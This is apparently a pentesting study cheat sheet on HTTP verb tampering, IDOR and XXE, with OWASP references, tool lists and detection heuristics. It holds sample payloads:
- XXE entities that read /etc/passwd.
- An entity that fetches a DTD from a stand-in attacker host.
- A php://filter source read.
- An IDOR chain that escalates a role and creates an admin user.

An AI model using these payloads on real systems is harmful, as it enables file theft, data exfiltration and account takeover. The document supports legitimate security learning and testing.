## 🛡️ Web Attacks

**Tags:** `#webattacks` `#webattacks/idor` `#webattacks/xxe` `#webattacks/verb-tamper` `#OWASP` `#SecurityTesting`

Web attacks are common threats to web applications. Below are major categories, techniques, payloads, and tools used in modern web exploitation.

---

## 🛠️ Tools by Category

> [!details]+ 🧰 Tools Breakdown

### 🛠️ #tools/httpfuzz
- `ffuf`
- `Burp Suite Intruder`
- `curl`
- `Zap`
- `httpie`

### 🛠️ #tools/idor
- `ffuf`
- `Turbo Intruder`
- Custom scripts

### 🛠️ #tools/xxe
- `Burp Suite`
- `XXEinjector`
- `dnslog.cn`
- `Burp Collaborator`

### 🛠️ #tools/general
- `Postman`
- `dirsearch`
- `wfuzz`
- `Nmap`
- `Gobuster`

---

## 🧮 Attack Matrix

| Vulnerability     | Disclosure | Function Manipulation | Privilege Escalation | External Interaction |
|-------------------|------------|------------------------|-----------------------|----------------------|
| **IDOR**          | ✅         | ✅                     | ✅                    | ❌                   |
| **XXE**           | ✅         | ❌                     | ❌                    | ✅                   |
| **Verb Tampering**| ❌         | ✅                     | ✅                    | ❌                   |

---

## 🧾 HTTP Verb Tampering  
**Reference:** [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering)

Exploits web servers that support multiple HTTP methods to bypass access controls.

### 🛑 Authorization Bypass
- Test various verbs: `GET`, `POST`, `PUT`, `DELETE`, `HEAD`, etc.
- Some verbs may execute actions without returning data or enforcing auth.

### 🧼 Security Filter Bypass
- Filters may sanitize only common verbs (e.g., `POST`) but allow others.
- Use alternate verbs to bypass logic or filters.

> [!details]+ 🧪 Sample Payloads
> ```http
> HEAD /admin HTTP/1.1
> X-HTTP-Method-Override: DELETE
> ```

---

## 🔍 Insecure Direct Object References (IDOR)  
**Reference:** [OWASP WSTG - IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)

Apps expose internal objects (user IDs, files, records) via user-controlled input with missing or broken access controls.

### 🔍 Identification Techniques
- Modify URL params: `?id=1001 → ?id=1000`, `999`, etc.
- Decode encoded values: base64, MD5, etc.
- Fuzz hashed values and test access to object IDs.

### 📊 Mass IDOR Enumeration
- Use tools like `ffuf`, `Burp Suite Intruder`, or scripts.

### 🔧 Insecure API Testing
- Modify `uid`, `uuid`, `role` via intercepted requests.
- Test alternate HTTP methods: `GET`, `PUT`, `POST`, `DELETE`.

> [!details]+ 🧪 Sample Payloads
> ```
> /api/profile.php?uid=2 → /api/profile.php?uid=1
> ```

### 🔗 Chaining IDORs

Attackers can combine multiple IDOR vulnerabilities to move from simple data access to full account takeover or privilege escalation.

---

#### 🧭 Typical Chain Flow

```text
1. Read other users’ data via GET (information disclosure)
↓
2. Extract user ID / UUID / role
↓
3. Use PUT/POST to modify user object (role escalation or impersonation)
↓
4. Access new privileges or perform critical actions
```

---

#### 🧪 Example: Full Chain Walkthrough

> \[!example]+ IDOR Chaining in API
> **Target:** `/api/profile/2`
>
> **Step 1 – Read Info:**
>
> ```http
> GET /api/profile/2
> ```
>
> * Returns full profile details of another user.
>
> **Step 2 – Escalate Role:**
>
> ```http
> PUT /api/profile/2
> Body: {"role": "web_admin"}
> ```
>
> * Role changes accepted without backend validation.
>
> **Step 3 – Use Admin Functions:**
>
> ```http
> POST /api/users
> Body: {"username": "hacker", "role": "admin"}
> ```
>
> * Create new admin user and pivot into panel access.

---

#### ⚙️ Tips for Testing Chained IDORs

* 🔀 Try **GET + PUT/POST/DELETE** combinations on the same resource
* 🧩 Look for **role**, `user_id`, `uuid`, or `email` fields
* 🕵️ Check cookies or JWTs for ID hints
* 🔄 Repeat with different users, especially admin accounts
* 📛 Watch for logic flaws where client-side roles are enforced (common in SPAs)

---

#### 🚨 Real-World Indicators

* Can read another user’s data **and** modify it
* App uses **predictable identifiers**
* No server-side check for `user_id` ownership or role validation
* Role or privilege escalation is possible via editable fields


## 💣 XML External Entity (XXE) Injection  
**Reference:** [OWASP XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing)

Abuses XML parsers to access local files or make external requests.

### 🧨 Attack Vectors
- **Local File Disclosure**: `/etc/passwd`, `.env`, etc.
- **Blind XXE**: Capture exfil via DNS/HTTP (`dnslog.cn`, Collaborator).
- **SSRF via XXE**: Access internal metadata services via DTDs.

> [!details]+ 🧪 Sample Payloads
> **Basic XXE**
> ```xml
> <!DOCTYPE root [
> <!ENTITY test SYSTEM "file:///etc/passwd">
> ]>
> <root><data>&test;</data></root>
> ```
> 
> **Blind XXE**
> ```xml
> <!DOCTYPE root [
> <!ENTITY % ext SYSTEM "http://attacker.com/xxe.dtd">
> ]>
> ```
> 
> **Advanced**
> ```xml
> <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
> ```

---

## 🧠 Detection Heuristics

> [!details]+ 🔎 Signs of Vulnerabilities
> - ⏱️ **Time-based behavior**: Delayed responses (e.g., Blind XXE, Blind SQLi)
> - 🔁 **Unexpected server responses**: Unusual HTTP codes or full resource output
> - 🧪 **Unvalidated input**: Changes in parameters reveal unauthorized data
> - 🔍 **Verb mismatch**: `DELETE` or `PUT` works despite UI disallowing them
> - 🔓 **No access denial**: Server returns data with missing or invalid auth

---



## 🎯 Real-World Mini-Scenario

**Target:** `https://portal.targetcorp.com/invoice?id=1001`

> [!example]+ 🧷 Chained Exploit Path
> - IDOR → Access invoice ID  
>   → XXE → Steal `/etc/passwd`  
>     → JWT Tampering → Forge admin token  
>       → HTTP Verb DELETE → Remove invoice without auth

---

## 🧭 Summary: When to Use What

- Suspect access control issues? → 🔍 IDOR  
- File uploads or XML parsing? → 💣 XXE  
- Backend behaves weirdly with `GET/PUT`? → 🧾 HTTP Verb Tampering
